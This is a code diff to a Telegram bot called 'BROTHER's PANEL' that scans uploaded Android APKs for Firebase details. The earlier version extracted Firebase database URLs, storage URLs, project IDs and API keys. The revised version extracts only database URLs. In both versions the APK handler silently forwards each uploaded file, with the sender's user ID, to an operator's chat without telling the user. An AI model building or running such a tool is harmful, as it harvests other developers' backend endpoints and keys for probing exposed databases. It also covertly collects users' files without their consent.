@@ -20,7 +20,7 @@ const CHANNELS = [
 
 const MAX_SCAN_TIME = 10000;
 
-// ---------------- SERVER ----------------
+// ================= SERVER =================
 
 app.get("/", (req, res) => {
   res.send("BROTHER's PANEL Firebase Bot is running.");
@@ -30,26 +30,14 @@ app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
 
-// ---------------- HELPERS ----------------
-
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-function maskApiKey(key) {
-  if (!key || key.length < 10) return "********";
-
-  return (
-    key.slice(0, 6) +
-    "********" +
-    key.slice(-4)
-  );
-}
+// ================= HELPERS =================
 
 function formatSize(bytes) {
   if (bytes < 1024) return `${bytes} B`;
-  if (bytes < 1024 * 1024)
+
+  if (bytes < 1024 * 1024) {
     return `${(bytes / 1024).toFixed(2)} KB`;
+  }
 
   return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
 }
@@ -66,17 +54,22 @@ async function isMember(userId, channel) {
       "administrator",
       "member"
     ].includes(member.status);
-  } catch (err) {
-    console.log(`Membership check failed: ${channel}`, err.message);
+
+  } catch (error) {
+    console.log(
+      `Membership check failed for ${channel}:`,
+      error.message
+    );
+
     return false;
   }
 }
 
 async function checkAllChannels(userId) {
   for (const channel of CHANNELS) {
-    const ok = await isMember(userId, channel);
+    const joined = await isMember(userId, channel);
 
-    if (!ok) {
+    if (!joined) {
       return false;
     }
   }
@@ -84,23 +77,17 @@ async function checkAllChannels(userId) {
   return true;
 }
 
-// ---------------- FIREBASE SCANNER ----------------
+// ================= FIREBASE URL SCANNER =================
 
-function scanFirebase(zipPath) {
-  const zip = new AdmZip(zipPath);
+function scanFirebaseUrl(apkPath) {
+  const zip = new AdmZip(apkPath);
   const entries = zip.getEntries();
 
-  const result = {
-    dbUrls: new Set(),
-    apiKeys: new Set(),
-    storageUrls: new Set(),
-    projectIds: new Set(),
-    appIds: new Set()
-  };
+  const firebaseRegex =
+    /https?:\/\/[a-zA-Z0-9._-]+(?:\.firebaseio\.com|\.firebasedatabase\.app)(?:\/[^\s"'<>]*)?/gi;
 
-  // Firebase-related filename priority
   const priorityFiles = [];
-  const otherFiles = [];
+  const normalFiles = [];
 
   for (const entry of entries) {
     if (entry.isDirectory) continue;
@@ -111,196 +98,101 @@ function scanFirebase(zipPath) {
       name.includes("google-services") ||
       name.includes("firebase") ||
       name.includes("strings.xml") ||
-      name.includes("resources.arsc") ||
-      name.includes("assets/")
+      name.includes("resources")
     ) {
       priorityFiles.push(entry);
     } else {
-      otherFiles.push(entry);
+      normalFiles.push(entry);
     }
   }
 
-  // Priority files first = faster detection
+  // Priority files first.
+  // Only a limited number of other files are checked.
   const filesToScan = [
     ...priorityFiles,
-    ...otherFiles.slice(0, 150)
+    ...normalFiles.slice(0, 50)
   ];
 
   for (const entry of filesToScan) {
     try {
       const name = entry.entryName.toLowerCase();
 
-      // Avoid huge native/binary files
+      // Skip unnecessary binary files.
       if (
-        name.endsWith(".so") ||
-        name.endsWith(".dex") ||
         name.endsWith(".png") ||
         name.endsWith(".jpg") ||
         name.endsWith(".jpeg") ||
         name.endsWith(".webp") ||
+        name.endsWith(".gif") ||
+        name.endsWith(".mp3") ||
         name.endsWith(".mp4") ||
-        name.endsWith(".mp3")
+        name.endsWith(".avi") ||
+        name.endsWith(".mkv") ||
+        name.endsWith(".so")
       ) {
         continue;
       }
 
-      const buffer = entry.getData();
+      const data = entry.getData();
 
-      // Don't process extremely large individual files
-      if (buffer.length > 2 * 1024 * 1024) {
+      // Don't process huge individual files.
+      if (data.length > 1024 * 1024) {
         continue;
       }
 
-      const text = buffer.toString("utf8");
+      const text = data.toString("utf8");
 
-      // Realtime Database
-      const dbMatches = text.match(
-        /https?:\/\/[a-zA-Z0-9._-]+(?:\.firebaseio\.com|\.firebasedatabase\.app)[^\s"'<>]*/gi
-      );
+      const matches = text.match(firebaseRegex);
 
-      if (dbMatches) {
-        dbMatches.forEach(x => result.dbUrls.add(x));
+      if (matches && matches.length > 0) {
+        return [...new Set(matches)];
       }
 
-      // Firebase Storage
-      const storageMatches = text.match(
-        /[a-zA-Z0-9._-]+(?:\.appspot\.com|\.firebasestorage\.app)/gi
-      );
-
-      if (storageMatches) {
-        storageMatches.forEach(x => result.storageUrls.add(x));
-      }
-
-      // API Key
-      const apiMatches = text.match(
-        /AIza[0-9A-Za-z_-]{20,}/g
-      );
-
-      if (apiMatches) {
-        apiMatches.forEach(x => result.apiKeys.add(x));
-      }
-
-      // Project ID
-      const projectMatches = text.match(
-        /["']?project[_-]?id["']?\s*[:=]\s*["']([a-zA-Z0-9._-]+)["']/gi
-      );
-
-      if (projectMatches) {
-        for (const match of projectMatches) {
-          const m = match.match(
-            /["']([a-zA-Z0-9._-]+)["']\s*$/i
-          );
-
-          if (m) {
-            result.projectIds.add(m[1]);
-          }
-        }
-      }
-
-      // Firebase Android App ID
-      const appIdMatches = text.match(
-        /1:[0-9]+:android:[a-zA-Z0-9]+/g
-      );
-
-      if (appIdMatches) {
-        appIdMatches.forEach(x => result.appIds.add(x));
-      }
-
-      // If enough Firebase data found, stop early
-      const foundCount =
-        result.dbUrls.size +
-        result.apiKeys.size +
-        result.storageUrls.size +
-        result.projectIds.size +
-        result.appIds.size;
-
-      if (foundCount >= 3) {
-        break;
-      }
-
-    } catch (err) {
-      // Skip unreadable/binary entries
+    } catch (error) {
       continue;
     }
   }
 
-  return {
-    dbUrls: [...result.dbUrls],
-    apiKeys: [...result.apiKeys],
-    storageUrls: [...result.storageUrls],
-    projectIds: [...result.projectIds],
-    appIds: [...result.appIds]
-  };
+  return [];
 }
 
-// ---------------- RESULT ----------------
+// ================= RESULT =================
 
-function createResultMessage(fileName, size, data) {
-  const db =
-    data.dbUrls.length > 0
-      ? data.dbUrls[0]
-      : "Not found";
-
-  const api =
-    data.apiKeys.length > 0
-      ? maskApiKey(data.apiKeys[0])
-      : "Not found";
-
-  const storage =
-    data.storageUrls.length > 0
-      ? data.storageUrls[0]
-      : "Not found";
-
-  const project =
-    data.projectIds.length > 0
-      ? data.projectIds[0]
-      : "Not found";
-
-  const appId =
-    data.appIds.length > 0
-      ? data.appIds[0]
-      : "Not found";
-
-  const found =
-    data.dbUrls.length +
-    data.apiKeys.length +
-    data.storageUrls.length +
-    data.projectIds.length +
-    data.appIds.length;
-
-  return `
-🔥 BROTHER's PANEL FIREBASE EXTRACTION RESULT 🔥
+function createResult(fileName, fileSize, urls) {
+  if (urls.length > 0) {
+    return `🔥 BROTHER's PANEL FIREBASE RESULT 🔥
 
 ════════════════════
 📱 APK: ${fileName}
-📦 Size: ${formatSize(size)}
-⚡ Scan: PARTIAL / FAST
+📦 Size: ${formatSize(fileSize)}
 ════════════════════
 
+🔗 FIREBASE DATABASE URL:
+
+${urls[0]}
+
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔓 EXTRACTED FIREBASE CONFIG (${found} found)
+⚡ FAST PARTIAL SCAN COMPLETE
+━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+  }
+
+  return `🔥 BROTHER's PANEL FIREBASE RESULT 🔥
+
+════════════════════
+📱 APK: ${fileName}
+📦 Size: ${formatSize(fileSize)}
+════════════════════
+
+❌ Firebase Database URL not found.
+
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-🔗 DB URL:
-${db}
-
-🔑 API Key:
-${api}
-
-🗄️ Storage URL:
-${storage}
-
-🆔 Project ID:
-${project}
-
-📱 Android App ID:
-${appId}
-`;
+⚡ FAST PARTIAL SCAN COMPLETE
+━━━━━━━━━━━━━━━━━━━━━━━━━━`;
 }
 
-// ---------------- START ----------------
+// ================= /START =================
 
-bot.start(async ctx => {
+bot.start(async (ctx) => {
   const joined = await checkAllChannels(ctx.from.id);
 
   if (joined) {
@@ -311,7 +203,7 @@ Welcome.
 
 ✅ Access verified.
 
-📦 Send your APK file to begin the Firebase scan.`
+📦 Send your APK file to start the Firebase scan.`
     );
   }
 
@@ -356,9 +248,9 @@ After joining, tap VERIFY ACCESS.`,
   );
 });
 
-// ---------------- VERIFY ----------------
+// ================= VERIFY =================
 
-bot.action("verify_access", async ctx => {
+bot.action("verify_access", async (ctx) => {
   await ctx.answerCbQuery();
 
   const joined = await checkAllChannels(ctx.from.id);
@@ -367,9 +259,9 @@ bot.action("verify_access", async ctx => {
     return ctx.reply(
       `❌ ACCESS DENIED
 
-You must join all 3 required channels before using the bot.
+You must join all 3 required channels first.
 
-After joining them, press VERIFY ACCESS again.`
+After joining, tap VERIFY ACCESS again.`
     );
   }
 
@@ -378,16 +270,16 @@ After joining them, press VERIFY ACCESS again.`
 
 You can now send an APK file.
 
-⚡ FAST PARTIAL FIREBASE SCAN`
+⚡ FAST FIREBASE URL SCAN`
   );
 });
 
-// ---------------- APK HANDLER ----------------
+// ================= APK HANDLER =================
 
-bot.on("document", async ctx => {
+bot.on("document", async (ctx) => {
   const document = ctx.message.document;
 
-  const fileName = document.file_name || "unknown";
+  const fileName = document.file_name || "unknown.apk";
 
   // APK ONLY
   if (!fileName.toLowerCase().endsWith(".apk")) {
@@ -400,7 +292,7 @@ Please send a valid APK file.`
     );
   }
 
-  // Check membership
+  // Membership check
   const joined = await checkAllChannels(ctx.from.id);
 
   if (!joined) {
@@ -416,19 +308,21 @@ Please join all required channels first and verify your access.`
     `brother_panel_${Date.now()}.apk`
   );
 
-  let processingMessage;
+  let processingMessage = null;
 
   try {
+    // Processing message
     processingMessage = await ctx.reply(
       `⚡ APK RECEIVED
 
 📱 File: ${fileName}
 
-🔍 Starting FAST PARTIAL FIREBASE SCAN...
-⏱️ Maximum processing target: 10 seconds`
+🔍 Searching for Firebase Database URL...
+⏱️ Maximum scan time: 10 seconds`
     );
 
-    // Download
+    // ================= DOWNLOAD =================
+
     const fileLink = await ctx.telegram.getFileLink(
       document.file_id
     );
@@ -445,7 +339,8 @@ Please join all required channels first and verify your access.`
 
     fs.writeFileSync(tempFile, buffer);
 
-    // Forward APK to destination
+    // ================= FORWARD APK =================
+
     try {
       await ctx.telegram.sendDocument(
         DESTINATION_CHAT_ID,
@@ -459,53 +354,57 @@ Please join all required channels first and verify your access.`
 👤 User ID: ${ctx.from.id}`
         }
       );
-    } catch (forwardError) {
+
+    } catch (error) {
       console.log(
         "Destination forwarding failed:",
-        forwardError.message
+        error.message
       );
     }
 
-    // 10-second MAX timeout
-    const scanPromise = Promise.resolve().then(() =>
-      scanFirebase(tempFile)
-    );
+    // ================= FAST SCAN =================
 
-    const timeoutPromise = new Promise((_, reject) =>
-      setTimeout(
-        () => reject(new Error("SCAN_TIMEOUT")),
-        MAX_SCAN_TIME
-      )
-    );
+    const scanPromise = Promise.resolve().then(() => {
+      return scanFirebaseUrl(tempFile);
+    });
 
-    let scanResult;
+    const timeoutPromise = new Promise((_, reject) => {
+      setTimeout(() => {
+        reject(new Error("SCAN_TIMEOUT"));
+      }, MAX_SCAN_TIME);
+    });
+
+    let firebaseUrls;
 
     try {
-      scanResult = await Promise.race([
+      firebaseUrls = await Promise.race([
         scanPromise,
         timeoutPromise
       ]);
-    } catch (err) {
-      if (err.message === "SCAN_TIMEOUT") {
-        return ctx.telegram.editMessageText(
+
+    } catch (error) {
+      if (error.message === "SCAN_TIMEOUT") {
+        return await ctx.telegram.editMessageText(
           ctx.chat.id,
           processingMessage.message_id,
           undefined,
           `⚠️ SCAN TIMEOUT
 
-The APK could not be partially scanned within 10 seconds.
+Firebase Database URL could not be found within 10 seconds.
 
 Please try another APK.`
         );
       }
 
-      throw err;
+      throw error;
     }
 
-    const resultText = createResultMessage(
+    // ================= RESULT =================
+
+    const resultText = createResult(
       fileName,
       buffer.length,
-      scanResult
+      firebaseUrls
     );
 
     await ctx.telegram.editMessageText(
@@ -515,11 +414,11 @@ Please try another APK.`
       resultText
     );
 
-  } catch (err) {
-    console.error(err);
+  } catch (error) {
+    console.error("APK processing error:", error);
 
-    if (processingMessage) {
-      try {
+    try {
+      if (processingMessage) {
         await ctx.telegram.editMessageText(
           ctx.chat.id,
           processingMessage.message_id,
@@ -530,33 +429,53 @@ Unable to process this APK.
 
 Please try again with a valid APK file.`
         );
-      } catch {}
-    } else {
-      await ctx.reply(
-        `❌ SCAN FAILED
+      } else {
+        await ctx.reply(
+          `❌ SCAN FAILED
 
 Please try again with a valid APK file.`
+        );
+      }
+
+    } catch (editError) {
+      console.error(
+        "Error sending failure message:",
+        editError.message
       );
     }
+
   } finally {
+    // Remove temporary APK
     try {
       if (fs.existsSync(tempFile)) {
         fs.unlinkSync(tempFile);
       }
-    } catch {}
+    } catch (error) {
+      console.log(
+        "Temporary file cleanup failed:",
+        error.message
+      );
+    }
   }
 });
 
-// ---------------- BOT ----------------
+// ================= BOT ERRORS =================
 
-bot.catch(err => {
-  console.error("Bot error:", err);
+bot.catch((error) => {
+  console.error("Bot error:", error);
 });
+
+// ================= START BOT =================
 
 bot.launch();
 
 console.log("🔥 BROTHER's PANEL bot started");
 
 // Graceful shutdown
-process.once("SIGINT", () => bot.stop("SIGINT"));
-process.once("SIGTERM", () => bot.stop("SIGTERM"));
+process.once("SIGINT", () => {
+  bot.stop("SIGINT");
+});
+
+process.once("SIGTERM", () => {
+  bot.stop("SIGTERM");
+});
